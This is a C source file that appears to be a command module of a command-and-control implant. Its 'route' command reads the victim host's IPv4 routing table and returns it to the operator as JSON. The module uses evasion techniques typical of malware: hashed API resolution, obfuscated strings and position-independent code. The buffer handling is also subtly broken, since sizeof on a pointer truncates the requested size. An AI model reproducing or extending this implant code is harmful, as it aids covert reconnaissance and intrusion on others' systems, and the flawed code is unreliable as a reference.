#include "config.h"
#ifdef INCLUDE_CMD_ROUTE

#include "commands.h"
#include "json_out.h"

typedef DWORD (WINAPI *fn_GetIpForwardTable_t)(void*, DWORD*, BOOL);

#pragma pack(push, 1)
struct MIB_IPFORWARDROW_A {
    DWORD dwDest; DWORD dwMask; DWORD dwPolicy; DWORD dwNextHop;
    DWORD dwIfIndex; DWORD dwType; DWORD dwProto; DWORD dwAge;
    DWORD dwMetric1; DWORD dwMetric2; DWORD dwMetric3; DWORD dwMetric4; DWORD dwMetric5;
};
struct MIB_IPFORWARDTABLE_A {
    DWORD dwNumEntries;
    MIB_IPFORWARDROW_A table[1];
};
#pragma pack(pop)

static void ip_str(DWORD ip, char* out) {
    unsigned char* b = (unsigned char*)&ip;
    int p = 0;
    for (int i = 0; i < 4; i++) {
        DWORD v = b[i];
        char tmp[4]; int ti = 0;
        if (v == 0) tmp[ti++] = '0';
        else while (v > 0) { tmp[ti++] = '0' + (char)(v % 10); v /= 10; }
        for (int j = ti - 1; j >= 0; j--) out[p++] = tmp[j];
        if (i < 3) out[p++] = '.';
    }
    out[p] = 0;
}

VOID cmd_route(PINSTANCE inst, PPARSER args, PPACKAGE response) {
    xstr(_iph, "iphlpapi.dll");
    HMODULE h_iph = inst->Win32.LoadLibraryA(_iph);
    fn_GetIpForwardTable_t pGet = h_iph ?
        (fn_GetIpForwardTable_t)resolve_function(h_iph, hash_string_djb2(XSTR("GetIpForwardTable"))) : NULL;
    if (!pGet) {
        package_add_string(inst, response, XSTR("iphlpapi resolve failed"));
        response->is_error = TRUE;
        return;
    }

    DWORD size = 0;
    if (pGet(NULL, &size, FALSE) != 122 || size == 0) {
        package_add_string(inst, response, XSTR("no routes"));
        return;
    }
    static BYTE* buf = NULL;
    // heap-resident: static arrays embed zero-filled in the PIC blob
    if (!buf) buf = (BYTE*)es_malloc(inst, 65536);
    if (!buf) return;
    if (size > sizeof(buf)) size = sizeof(buf);
    if (pGet(buf, &size, FALSE) != 0) {
        package_add_string(inst, response, XSTR("GetIpForwardTable failed"));
        response->is_error = TRUE;
        return;
    }

    DWORD count = *(DWORD*)buf;
    JSON_BUF jb;
    j_init(&jb);
    j_append_raw(&jb, "{\"routes\":[");
    for (DWORD i = 0; i < count && i < 512; i++) {
        MIB_IPFORWARDROW_A* row = (MIB_IPFORWARDROW_A*)(buf + 4 + i * sizeof(MIB_IPFORWARDROW_A));
        if (i) j_append_raw(&jb, ",");
        char d[16], m[16], g[16];
        ip_str(row->dwDest, d);
        ip_str(row->dwMask, m);
        ip_str(row->dwNextHop, g);
        j_append_raw(&jb, "{\"dest\":");
        j_append_str(&jb, d);
        j_append_raw(&jb, ",\"mask\":");
        j_append_str(&jb, m);
        j_append_raw(&jb, ",\"gateway\":");
        j_append_str(&jb, g);
        j_append_raw(&jb, ",\"metric\":");
        j_append_uint(&jb, row->dwMetric1);
        j_append_raw(&jb, ",\"ifindex\":");
        j_append_uint(&jb, row->dwIfIndex);
        j_append_raw(&jb, "}");
    }
    j_append_raw(&jb, "],\"count\":");
    j_append_uint(&jb, count);
    j_append_raw(&jb, "}");
    package_add_bytes(inst, response, (BYTE*)jb.buf, jb.len);
}

#endif
